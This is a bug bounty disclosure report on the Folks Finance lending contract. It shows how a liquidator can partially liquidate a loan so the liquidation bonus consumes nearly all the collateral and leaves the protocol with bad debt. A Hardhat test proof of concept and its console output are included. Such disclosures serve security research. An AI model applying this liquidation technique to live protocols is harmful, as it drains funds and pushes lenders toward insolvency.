# Boost \_ Folks Finance 33588 - \[Smart Contract - Insight] The liquidator can make the protocol incur

Submitted on Wed Jul 24 2024 02:30:49 GMT-0400 (Atlantic Standard Time) by @OxAnmol for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33588

Report type: Smart Contract

Report severity: Insight

Target: <https://testnet.snowtrace.io/address/0x2cAa1315bd676FbecABFC3195000c642f503f1C9>

Impacts:

* Protocol insolvency

## Description

## Brief/Intro

The liquidator can partially liquidate loans at the edge of the borrowed amount and eat up all the collateral because of the liquidation bonus. This will cause the borrowed position to lose almost all the available collateral and there will still be a significant amount of loan that cannot be covered, resulting in the bad debt for the protocol.

## Vulnerability Details

The protocol allows partial liquidation of the loans, there is also a liquidation bonus for the liquidator which is calculated based on the liquidation amount, and the liquidation bonus is paid from the remaining collateral. Liquidator can take advantage of this by liquidating 96% of loans and booking the remaining as a profit leading to bad debt for the protocol.

## Attack Flow

* Alice borrow 1000 USDC by providing 1 ETH at 3000$
* After some time the interest is 47 USDC so total loan is now 1047 USDC
* Now the ETH price suddenly tanks to 1000 $
* Liquidator will liquidate 960 USDC amount
* Liquidation Bonus will be 38.5USDC worth ETH from borrower’s collateral
* Remaining debt will be 1047 - 960 = 87 USDC
* Remaining collateral value will be 1.5$

## Impact Details

The protocol will incur bad debt and can lead to insolvency.

## References

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/LoanManager.sol#L233>

## Proof of concept

Here is a simple test to show how this attack works, paste this in `LoanManager.test.ts`.

```js
describe("Liquidate", () => {
    it.only("Protocol incur bad debt", async () => {
      const {
        hub,
        loanManager,
        loanManagerAddress,
        oracleManager,
        pools,
        loanId: violatorLoanId,
        accountId: violatorAccountId,
        loanTypeId,
        depositFAmount,
        borrowAmount,
        usdcVariableInterestIndex: oldVariableInterestIndex,
      } = await loadFixture(depositEtherAndVariableBorrowUSDCFixture);

      // create liquidator loan
      const liquidatorLoanId = getRandomBytes(BYTES32_LENGTH);
      const liquidatorAccountId = getAccountIdBytes("LIQUIDATOR_ACCOUNT_ID");
      const liquidatorLoanName = getRandomBytes(BYTES32_LENGTH);
      await loanManager
        .connect(hub)
        .createUserLoan(liquidatorLoanId, liquidatorAccountId, loanTypeId, liquidatorLoanName);

      /* ---------------------- LIQUIDATOR DEPOSITS 1000 USDC --------------------- */

      const liquidatorDepositAmount = BigInt(1000e6); // 1,000 USDC
      const liquidatorDepositFAmount = liquidatorDepositAmount;
      const liquidatorDepositInterestIndex = BigInt(1e18);
      const usdcPrice = BigInt(1e18);
      await pools.USDC.pool.setDepositPoolParams({
        fAmount: liquidatorDepositFAmount,
        depositInterestIndex: liquidatorDepositInterestIndex,
        priceFeed: { price: usdcPrice, decimals: pools.USDC.tokenDecimals },
      });
      await loanManager
        .connect(hub)
        .deposit(liquidatorLoanId, liquidatorAccountId, pools.USDC.poolId, liquidatorDepositAmount);

      /* ------------------------- ETH PRICE DROP TO $1000 ------------------------ */
      const ethNodeOutputData = getNodeOutputData(BigInt(1000e18));
      await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData);

      // calculate interest
      const variableInterestIndex = BigInt(1.1e18);
      const stableInterestRate = BigInt(0.1e18);
      await pools.USDC.pool.setBorrowPoolParams({ variableInterestIndex, stableInterestRate });
      await pools.USDC.pool.setUpdatedVariableBorrowInterestIndex(variableInterestIndex);
      const borrowBalance = calcBorrowBalance(borrowAmount, variableInterestIndex, oldVariableInterestIndex);
      // borrow balance = 1047619048

      // Violator:
      // Collateral 1 ETH = $1,000
      // Borrow 1,000 USDC = $1,000

      // Liquidator:
      // Collateral 10,000 USDC = $10,000
      // Borrow $0
      const repayAmount = BigInt(960e6); // 900 USDC
      // convert 900 USDC into fETH/ETH amount
      const collateralFAmount = convToCollateralFAmount(
        repayAmount,
        ethNodeOutputData.price,
        pools.ETH.tokenDecimals,
        usdcPrice,
        pools.USDC.tokenDecimals,
        BigInt(1e18)
      );
      // collateral to seize + liquidation bonus
      const seizeCollateralAmount = convToSeizedCollateralAmount(
        repayAmount,
        ethNodeOutputData.price,
        pools.ETH.tokenDecimals,
        usdcPrice,
        pools.USDC.tokenDecimals,
        pools.USDC.liquidationBonus
      );

      const seizeCollateralFAmount = toFAmount(seizeCollateralAmount, BigInt(1e18));
      // Protocol fee
      const reserveCollateralFAmount = calcReserveCol(
        seizeCollateralFAmount,
        collateralFAmount,
        pools.ETH.liquidationFee
      );
      const liquidatorCollateralFAmount = seizeCollateralFAmount - reserveCollateralFAmount;

      // liquidate
      const minSeizedAmount = BigInt(0);
      const liquidate = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          repayAmount,
          minSeizedAmount
        );
      // check events
      const latestBlockTimestamp = await getLatestBlockTimestamp();
      // check violator loan
      const violatorLoan = await loanManager.getUserLoan(violatorLoanId);
      const violatorCollaterals: UserLoanCollateral[] = [
        {
          balance: depositFAmount - seizeCollateralFAmount,
          rewardIndex: BigInt(0),
        },
      ];
      const violatorBorrows: UserLoanBorrow[] = [
        {
          amount: borrowAmount - repayAmount,
          balance: borrowBalance - repayAmount,
          lastInterestIndex: variableInterestIndex,
          stableInterestRate: BigInt(0),
          lastStableUpdateTimestamp: BigInt(0),
          rewardIndex: BigInt(0),
        },
      ];

      console.log("voilator Remaining loan: ", ethers.formatUnits(violatorLoan[5][0][1], 6), " USDC");
      console.log("voilator Remaining collateral: ", ethers.formatUnits(violatorLoan[4][0][0], 18), "ETH");

      // check liquidator loan
      const liquidatorLoan = await loanManager.getUserLoan(liquidatorLoanId);

      console.log("liquidator loan: ", ethers.formatUnits(liquidatorLoan[5][0][1], 6), " USDC");
      console.log("liquidator collateral Gain: ", ethers.formatUnits(liquidatorLoan[4][1][0], 18), "ETH");
    }))}
```

### Console Output

```shell
 LoanManager (unit tests)
    Liquidate
voilator Remaining loan:  87.619048  USDC
voilator Remaining collateral:  0.0016 ETH
liquidator loan:  960.0  USDC
liquidator collateral Gain:  0.99456 ETH
      ✔ protocol incur bad debt (2007ms)

```
